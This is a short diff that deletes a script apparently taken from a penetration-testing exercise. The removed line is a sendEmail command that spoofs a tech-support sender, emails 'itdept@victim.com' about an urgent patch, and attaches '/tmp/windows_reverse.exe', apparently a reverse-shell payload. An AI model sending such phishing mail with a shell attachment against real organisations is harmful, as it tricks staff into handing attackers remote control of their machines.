@@ -1,4 +1,0 @@
-#!/usr/bin/peno
-
-
-sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.177.55 -u Important urgent patch Upgrade Instructions -a /tmp/windows_reverse.exe
